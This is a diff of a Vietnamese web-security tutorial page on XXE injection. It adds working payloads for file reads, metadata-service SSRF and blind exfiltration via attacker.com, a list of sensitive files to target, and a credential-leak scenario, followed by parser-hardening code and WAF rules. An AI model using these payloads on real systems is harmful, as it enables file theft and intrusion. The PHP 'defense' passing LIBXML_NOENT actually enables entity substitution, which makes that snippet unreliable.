@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 16: XXE — Hieu Nguyen</title>
-  <meta name="description" content="XML External Entity, disable DTD, Content-Type confusion.">
+  <title>Chương 16: XXE — XML External Entity Injection — Hieu Nguyen</title>
+  <meta name="description" content="Chương 16: XXE — XML External Entity Injection — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,58 +40,327 @@
         <span>›</span>
         <span>16. XXE</span>
       </div>
-      <h1>Chương 16: XXE</h1>
-      <p class="lede">Parser XML mặc định hay tải entity ngoài. Đó là SSRF/file read núp sau SOAP/upload.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> IV — Injection</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>XXE: XML khai entity trỏ file local hoặc URL. Parser resolve → đọc file hoặc gọi nội bộ (SSRF). Hay gặp SOAP, Office XML, SAML, upload “document”.</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Tắt DTD / external entity trên parser.</li>
-        <li>Không parse XML nếu API nhận JSON.</li>
-        <li>Limit size; không follow HTTP entity.</li>
-        <li>Content-Type: đừng parse XML khi client gửi nhầm.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>WAF có rule XXE — phụ. Image libxml phiên bản còn hỗ trợ. NetworkPolicy chặn Pod app gọi metadata/IMDS.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Disable external entity.</li>
-        <li>Prefer JSON.</li>
-        <li>Giới hạn parser.</li>
-        <li>Egress siết.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>XXE dẫn tới class lỗ nào khác?</li>
-        <li>SAML/SOAP vì sao hay dính?</li>
-        <li>Tắt DTD ở đâu?</li>
-        <li>Upload docx liên quan gì?</li>
-        <li>Parser default-safe hay default-mở?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 16: XXE — XML External Entity Injection</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>XXE</strong> (XML External Entity Injection — Tiêm thực thể XML bên ngoài) là lỗ hổng xảy ra khi XML parser xử lý input có chứa external entity references độc hại.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Cao — XXE có thể dẫn đến đọc files nội bộ, SSRF, và trong một số trường hợp, RCE.</p>
+<hr>
+<h2 id="xml-entities-là-gì">XML Entities là gì?</h2>
+<p>XML cho phép định nghĩa <strong>entities</strong> — biến có thể được tham chiếu trong document:</p>
+<pre><code class="language-xml">&lt;!-- Internal entity --&gt;
+&lt;!DOCTYPE note [
+    &lt;!ENTITY greeting &quot;Hello, World!&quot;&gt;
+]&gt;
+&lt;note&gt;&amp;greeting;&lt;/note&gt;
+&lt;!-- Parser thay &amp;greeting; bằng &quot;Hello, World!&quot; --&gt;
 
-      <div class="docs-tags">
-        <span class="docs-tag">xxe</span>
-        <span class="docs-tag">xml</span>
-        <span class="docs-tag">ssrf</span>
-      </div>
+&lt;!-- External entity: load từ file hoặc URL --&gt;
+&lt;!DOCTYPE note [
+    &lt;!ENTITY ext SYSTEM &quot;http://example.com/data.txt&quot;&gt;
+]&gt;
+&lt;note&gt;&amp;ext;&lt;/note&gt;
+&lt;!-- Parser fetch URL và thay thế bằng content --&gt;
+</code></pre>
+<p><strong>XXE xảy ra khi parser cho phép external entities từ untrusted input.</strong></p>
+<hr>
+<h2 id="các-loại-xxe">Các loại XXE</h2>
+<h3 id="1-file-retrieval">1. File Retrieval</h3>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-http">HTTP/1.1 400 Bad Request
+...
+&quot;Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin...&quot;
+</code></pre>
+<p><strong>Files thú vị:</strong></p>
+<pre><code class="language-text">/etc/passwd                    → usernames
+/etc/shadow                    → hashed passwords (nếu readable)
+/etc/hosts                     → internal hostnames
+/proc/self/environ             → environment variables (secrets!)
+/proc/self/cmdline             → command line args
+/var/log/apache2/access.log    → logs
+/var/www/html/config.php       → app config với DB password
+~/.ssh/id_rsa                  → SSH private key
+</code></pre>
+<h3 id="2-xxe-để-ssrf">2. XXE để SSRF</h3>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;
+]&gt;
+&lt;request&gt;&amp;xxe;&lt;/request&gt;
+</code></pre>
+<p>Parser fetch URL → giống SSRF, nhưng thông qua XXE.</p>
+<h3 id="3-blind-xxe--không-thấy-output">3. Blind XXE — Không thấy output</h3>
+<p>Nhiều apps parse XML nhưng không echo lại content của entities.</p>
+<p><strong>Out-of-Band Exfiltration:</strong></p>
+<pre><code class="language-xml">&lt;!-- Payload gửi đến server --&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY % xxe SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;
+    %xxe;
+]&gt;
+&lt;foo&gt;&amp;exfil;&lt;/foo&gt;
+</code></pre>
+<pre><code class="language-xml">&lt;!-- evil.dtd trên attacker.com --&gt;
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % wrap &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;&gt;
+%wrap;
+</code></pre>
+<pre><code class="language-text">Flow:
+1. Parser load evil.dtd từ attacker.com
+2. %file entity = content của /etc/passwd
+3. %wrap tạo entity mới: exfil = fetch attacker.com với content
+4. Parser fetch http://attacker.com/?data=root:x:0:0:root:/root:/bin/bash...
+5. Hacker xem access log → có /etc/passwd content
+</code></pre>
+<p><strong>Error-based Blind XXE:</strong></p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;
+    %eval;
+    %error;
+]&gt;
+</code></pre>
+<pre><code class="language-text">Parser trigger error: &quot;file not found: /nonexistent/root:x:0:0...&quot;
+Error message chứa file content!
+</code></pre>
+<h3 id="4-xinclude-attack">4. XInclude Attack</h3>
+<p>Khi app nhận XML từ user nhưng nhúng vào server-side XML document (không control DTD):</p>
+<pre><code class="language-xml">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
+    &lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;
+&lt;/foo&gt;
+</code></pre>
+<h3 id="5-xxe-qua-file-upload">5. XXE qua File Upload</h3>
+<p>Nhiều file formats dùng XML internally:</p>
+<p><strong>SVG upload:</strong></p>
+<pre><code class="language-svg">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;
+]&gt;
+&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+    &lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
+<p><strong>DOCX/XLSX/PPTX</strong> (Office XML formats):</p>
+<pre><code class="language-text">DOCX = ZIP archive chứa XML files
+→ Inject XXE vào word/document.xml hoặc [Content_Types].xml
+→ Upload DOCX → server parse XML → XXE!
+</code></pre>
+<p><strong>RSS/Atom feed:</strong></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE feed [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;feed&gt;&amp;xxe;&lt;/feed&gt;
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-đọc-config-file">Kịch bản tấn công: Đọc Config File</h2>
+<pre><code class="language-text">Target: E-commerce app, endpoint POST /api/stock-check nhận XML
+
+1. Normal request:
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+
+2. XXE payload:
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE stockCheck [&lt;!ENTITY xxe SYSTEM &quot;file:///var/www/html/.env&quot;&gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+
+3. Response:
+{
+    &quot;error&quot;: &quot;Invalid product ID: 
+        DB_HOST=mysql
+        DB_USER=root
+        DB_PASSWORD=Super$ecret123!
+        AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+        AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...&quot;
+}
+
+4. Hacker có:
+   - Database credentials
+   - AWS credentials
+   → Full system compromise
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ App nhận XML input không? (Content-Type: text/xml, application/xml)
+□ App accept file upload? (SVG, DOCX, XLSX, ODT, RSS)
+□ Thêm DOCTYPE declaration với external entity
+□ Test với file:///etc/passwd
+□ Test với HTTP URL để detect SSRF via XXE
+□ Test XInclude cho SOAP/REST endpoints nhúng user content vào XML
+□ Kiểm tra error messages lộ file content
+□ Test blind XXE với Burp Collaborator (out-of-band)
+</code></pre>
+<p><strong>Content-Type test:</strong></p>
+<pre><code class="language-text">Một số apps accept XML dù không expect:
+- Thay Content-Type: application/json → application/xml
+- Convert JSON body sang equivalent XML
+- Server có thể switch parser → XXE possible
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-disable-external-entities-và-dtd-processing">1. Disable External Entities và DTD Processing</h3>
+<pre><code class="language-python"># Python lxml
+from lxml import etree
+
+parser = etree.XMLParser(
+    resolve_entities=False,   # Disable entity resolution
+    no_network=True,          # Disable network access
+    load_dtd=False,           # Disable DTD loading
+)
+
+try:
+    tree = etree.fromstring(xml_content, parser=parser)
+except etree.XMLSyntaxError as e:
+    raise ValueError(f&quot;Invalid XML: {e}&quot;)
+</code></pre>
+<pre><code class="language-java">// Java - DocumentBuilderFactory
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+
+// Disable external entities
+dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+dbf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+</code></pre>
+<pre><code class="language-php">// PHP - libxml
+libxml_disable_entity_loader(true);  // Deprecated in PHP 8.0, disabled by default
+
+// PHP 8.0+: external entities disabled by default
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
+</code></pre>
+<pre><code class="language-csharp">// C# - XmlReader
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;  // Không cho phép DTD
+settings.XmlResolver = null;  // Không resolve external entities
+XmlReader reader = XmlReader.Create(input, settings);
+</code></pre>
+<h3 id="2-dùng-json-thay-vì-xml">2. Dùng JSON thay vì XML</h3>
+<pre><code class="language-text">Nếu có thể, dùng JSON API thay vì XML
+→ JSON không có entity/DTD concept → không có XXE
+</code></pre>
+<h3 id="3-validate-và-sanitize-xml-input">3. Validate và Sanitize XML Input</h3>
+<pre><code class="language-python"># Strip DOCTYPE declaration trước khi parse
+import re
+
+def strip_dangerous_xml(xml_str: str) -&gt; str:
+    # Remove DOCTYPE declarations
+    xml_str = re.sub(r&#x27;&lt;!DOCTYPE[^&gt;]*&gt;&#x27;, &#x27;&#x27;, xml_str, flags=re.IGNORECASE)
+    # Remove entity references  
+    xml_str = re.sub(r&#x27;&lt;!ENTITY[^&gt;]*&gt;&#x27;, &#x27;&#x27;, xml_str, flags=re.IGNORECASE)
+    return xml_str
+</code></pre>
+<h3 id="4-file-upload-validation">4. File Upload Validation</h3>
+<pre><code class="language-python">import zipfile
+import xml.etree.ElementTree as ET
+
+def validate_docx(file_content: bytes) -&gt; bool:
+    try:
+        with zipfile.ZipFile(io.BytesIO(file_content)) as zf:
+            for name in zf.namelist():
+                if name.endswith(&#x27;.xml&#x27;) or name.endswith(&#x27;.rels&#x27;):
+                    content = zf.read(name).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)
+                    
+                    # Check for DOCTYPE/ENTITY
+                    if &#x27;&lt;!DOCTYPE&#x27; in content or &#x27;&lt;!ENTITY&#x27; in content:
+                        return False  # Reject file
+            return True
+    except (zipfile.BadZipFile, Exception):
+        return False
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>WAF Rules cho XXE:</strong></p>
+<pre><code class="language-text">ModSecurity CRS có rules detect XXE:
+- REQUEST-944-APPLICATION-ATTACK-JAVA.conf
+- Check cho &lt;!DOCTYPE, &lt;!ENTITY, SYSTEM, PUBLIC keywords
+
+Custom rule:
+SecRule REQUEST_BODY &quot;@contains &lt;!ENTITY&quot; \
+    &quot;id:1001,phase:2,deny,status:400,msg:&#x27;XXE attempt&#x27;&quot;
+</code></pre>
+<p><strong>Kubernetes: Hạn chế outbound connections:</strong></p>
+<pre><code class="language-yaml"># Nếu app bị XXE, network policy hạn chế:
+# - Không fetch file:// (local file), network policy không help
+# - Fetch HTTP outbound: block bằng egress policy
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+spec:
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - podSelector:
+            matchLabels:
+              tier: database
+      # Không có outbound internet → limit blind XXE SSRF
+</code></pre>
+<p><strong>SAST:</strong></p>
+<pre><code class="language-bash"># Detect unsafe XML parsing
+semgrep --config=p/java-xxe src/
+semgrep --config=p/python-xxe src/
+
+# Bandit cho Python
+bandit -r . -t B313,B314,B315,B316,B317,B318,B319,B320
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>XXE: inject external entities vào XML → đọc files, SSRF, trong trường hợp đặc biệt RCE.</li>
+<li>4 loại: file retrieval, SSRF, blind (out-of-band/error-based), XInclude.</li>
+<li>Ẩn trong file uploads: SVG, DOCX, XLSX, RSS feeds.</li>
+<li>Phòng chống #1: Disable DTD processing và external entity resolution.</li>
+<li>Prefer JSON over XML khi có thể.</li>
+<li>Mỗi ngôn ngữ có cách cụ thể để disable — luôn configure explicitly.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>XXE xảy ra do tính năng nào của XML được enable? Tại sao tính năng đó tồn tại?</li>
+<li>Tại sao DOCX/XLSX files có thể là vector cho XXE attack?</li>
+<li>Blind XXE và in-band XXE khác nhau như thế nào? Cách detect blind XXE?</li>
+<li>XInclude khác với External Entity Injection như thế nào?</li>
+<li>Tại sao disable DTD processing ở parser level tốt hơn là filter input?</li>
+</ol>
       <div class="docs-pager">
-        <a href="../15/">Previous · 15. SSRF</a>
-        <a href="../17/">Next · 17. File Upload</a>
+        <a href="../14/">Previous · 14. Command Injection</a>
+        <a href="../25/">Next · 25. SSTI</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#xml-entities-là-gì">XML Entities là gì?</a>
+        <a href="#các-loại-xxe">Các loại XXE</a>
+        <a class="depth-3" href="#1-file-retrieval">1. File Retrieval</a>
+        <a class="depth-3" href="#2-xxe-để-ssrf">2. XXE để SSRF</a>
+        <a class="depth-3" href="#3-blind-xxe--không-thấy-output">3. Blind XXE — Không thấy output</a>
+        <a class="depth-3" href="#4-xinclude-attack">4. XInclude Attack</a>
+        <a class="depth-3" href="#5-xxe-qua-file-upload">5. XXE qua File Upload</a>
+        <a href="#kịch-bản-tấn-công-đọc-config-file">Kịch bản tấn công: Đọc Config File</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-disable-external-entities-và-dtd-processing">1. Disable External Entities và DTD Processing</a>
+        <a class="depth-3" href="#2-dùng-json-thay-vì-xml">2. Dùng JSON thay vì XML</a>
+        <a class="depth-3" href="#3-validate-và-sanitize-xml-input">3. Validate và Sanitize XML Input</a>
+        <a class="depth-3" href="#4-file-upload-validation">4. File Upload Validation</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
